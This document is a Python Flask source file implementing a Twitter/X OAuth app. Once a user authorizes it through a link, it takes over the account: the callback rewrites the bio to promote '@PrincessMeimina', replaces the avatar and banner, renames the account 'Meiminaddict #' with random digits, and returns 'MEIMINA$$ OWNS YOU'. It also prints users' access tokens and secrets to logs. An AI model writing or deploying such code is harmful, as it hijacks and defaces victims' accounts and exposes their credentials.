import os
from flask import Flask, redirect, render_template, request, url_for
import oauth2 as oauth
import urllib.request
import urllib.parse
import urllib.error
import json
import base64
import mimetypes
import random

app = Flask(__name__)

app.debug = False

request_token_url = 'https://api.twitter.com/oauth/request_token'
access_token_url = 'https://api.twitter.com/oauth/access_token'
authorize_url = 'https://api.twitter.com/oauth/authorize'
show_user_url = 'https://api.twitter.com/1.1/users/show.json'
update_profile_url = 'https://api.x.com/1.1/account/update_profile.json'
update_profile_image_url = 'https://api.x.com/1.1/account/update_profile_image.json'
update_profile_banner_url = 'https://api.x.com/1.1/account/update_profile_banner.json'
message_url = 'https://api.x.com/1.1/direct_messages/events/new.json'
# Support keys from environme
# Support keys from environment vars (Heroku).
app.config['APP_CONSUMER_KEY'] = os.environ.get("API_KEY")
app.config['APP_CONSUMER_SECRET'] = os.environ.get("API_SECRET")

# alternatively, add your key and secret to config.cfg
# config.cfg should look like:
# APP_CONSUMER_KEY = 'API_Key_from_Twitter'
# APP_CONSUMER_SECRET = 'API_Secret_from_Twitter

oauth_store = {}
m_endpoint = {}

@app.route('/ping')
def ping():
    print("heartbeat")
    return "PONG"

def get_oauth_token():
    print("inside get_oauth_token")
    # note that the external callback URL must be added to the whitelist on
    # the developer.twitter.com portal, inside the app settings
    app_callback_url = os.environ.get("REDIRECT_URI")

    tstr=urllib.parse.urlencode({"oauth_callback": app_callback_url})
    turi=request_token_url+"?"+tstr
    print(turi)

    # Generate the OAuth request tokens, then display them
    consumer = oauth.Consumer(
        app.config['APP_CONSUMER_KEY'], app.config['APP_CONSUMER_SECRET'])
    client = oauth.Client(consumer)
    #resp, content = client.request(request_token_url, "POST", body=urllib.parse.urlencode({
     #                              "oauth_callback": app_callback_url}))
    resp, content = client.request(turi,"POST")
    print(content)

    if resp['status'] != '200':
        error_message = 'Invalid response, status {status}, {message}'.format(
            status=resp['status'], message=content.decode('utf-8'))
        return error_message

    request_token = dict(urllib.parse.parse_qsl(content))
    oauth_token = request_token[b'oauth_token'].decode('utf-8')
    oauth_token_secret = request_token[b'oauth_token_secret'].decode('utf-8')
    oauth_store[oauth_token] = oauth_token_secret
    return oauth_token
    
@app.route('/')
def start():
    print("inside start")
    oauth_token=get_oauth_token()
    starturi=""+f'{authorize_url}?oauth_token={oauth_token}'
    m_endpoint[oauth_token] = "start"
    print(starturi)
    return redirect(starturi)

@app.route('/test')
def test():
    print("inside test")
    oauth_token=get_oauth_token()
    starturi=""+f'{authorize_url}?oauth_token={oauth_token}'
    m_endpoint[oauth_token] = "test"
    print(starturi)
    return redirect(starturi)
    
def update_profile_banner(client):
    print("inside update_profile_banner")
    with open("banner.jpg", "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read())
        params=urllib.parse.urlencode({"banner":encoded_string.decode("utf-8")})
        resp,content=client.request(update_profile_banner_url,"POST",body=params)
        if resp['status'] != '201':
            print( "ERROR "+resp['status'])
            print(resp)
            return
        print(content)
        return

def update_profile_image(client):
    print("inside update_profile_image")
    with open("meiminass.png", "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read())
        params=urllib.parse.urlencode({"image":encoded_string.decode("utf-8")})
        resp,content=client.request(update_profile_image_url,"POST",body=params)
        if resp['status'] != '200':
            print( "ERROR "+resp['status'])
            print(resp)
            return
        print(content)
        return

def update_profile(client,url,location,description):
    #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
    params=urllib.parse.urlencode({"description":description,"url":url,"location":location})
    furi=update_profile_url+"?"+params
    print(furi)
    resp, content = client.request(furi, "POST")
    if resp['status'] != '200':
        print( "ERROR "+resp['status'])
        return
    print(content)
    return

def update_profile_name(client,name):
    #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
    params=urllib.parse.urlencode({"name":name})
    furi=update_profile_url+"?"+params
    print(furi)
    resp, content = client.request(furi, "POST")
    if resp['status'] != '200':
        print( "ERROR "+resp['status'])
        return
    print(content)
    return

def send_message(client,id,msg):
    print("inside send message")
    params=urllib.parse.urlencode({"type":"message_create",
                                  "message_create.target.recipient_id":id,
                                  "message_create.message_data":f'\{\"text\":\"{msg}\"\}' })
    headers={"Content-Type":"application/json"}
    resp,content=client.request(message_url,"POST",headers=headers,body=params)
    if resp['status'] != '200':
        print( "ERROR "+resp['status'])
        return
    print(content)       
   
def clear_maps(oauth_token):
    del oauth_store[oauth_token]
    del m_endpoint[oauth_token]
    
@app.route('/api/callback')
def callback():
    # Accept the callback params, get the token and call the API to
    # display the logged-in user's name and handle
    print("inside callback")
    oauth_token = request.args.get('oauth_token')
    oauth_verifier = request.args.get('oauth_verifier')
    oauth_denied = request.args.get('denied')

    # if the OAuth request was denied, delete our local token
    # and show an error message
    if oauth_denied:
        if oauth_denied in oauth_store:
            clear_maps(oauth_denied)
        return "the OAuth request was denied by this user"

    if not oauth_token or not oauth_verifier:
        return "callback param(s) missing"

    # unless oauth_token is still stored locally, return error
    if oauth_token not in oauth_store:
        return "oauth_token not found locally"

    oauth_token_secret = oauth_store[oauth_token]
    endpoint = m_endpoint[oauth_token]

    # if we got this far, we have both callback params and we have
    # found this token locally

    consumer = oauth.Consumer(
        app.config['APP_CONSUMER_KEY'], app.config['APP_CONSUMER_SECRET'])
    token = oauth.Token(oauth_token, oauth_token_secret)
    token.set_verifier(oauth_verifier)
    client = oauth.Client(consumer, token)

    resp, content = client.request(access_token_url, "POST")
    access_token = dict(urllib.parse.parse_qsl(content))

    screen_name = access_token[b'screen_name'].decode('utf-8')
    user_id = access_token[b'user_id'].decode('utf-8')

    # These are the tokens you would store long term, someplace safe
    real_oauth_token = access_token[b'oauth_token'].decode('utf-8')
    real_oauth_token_secret = access_token[b'oauth_token_secret'].decode(
        'utf-8')

    
    print(f'user_id:{user_id}\nendpoint:{endpoint}')
    print(real_oauth_token)
    print(real_oauth_token_secret)

    # Call api.twitter.com/1.1/users/show.json?user_id={user_id}
    real_token = oauth.Token(real_oauth_token, real_oauth_token_secret)
    real_client = oauth.Client(consumer, real_token)

    if endpoint == 'start':
        description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
        update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
        update_profile_image(real_client)
        update_profile_banner(real_client)
        name = "Meiminaddict #"+str(random.random())[2:8]
        update_profile_name(real_client,name)

    if endpoint == 'test':
        print("testing endpoint")
        
    clear_maps(oauth_token)
    
    return "MEIMINA$$ OWNS YOU"
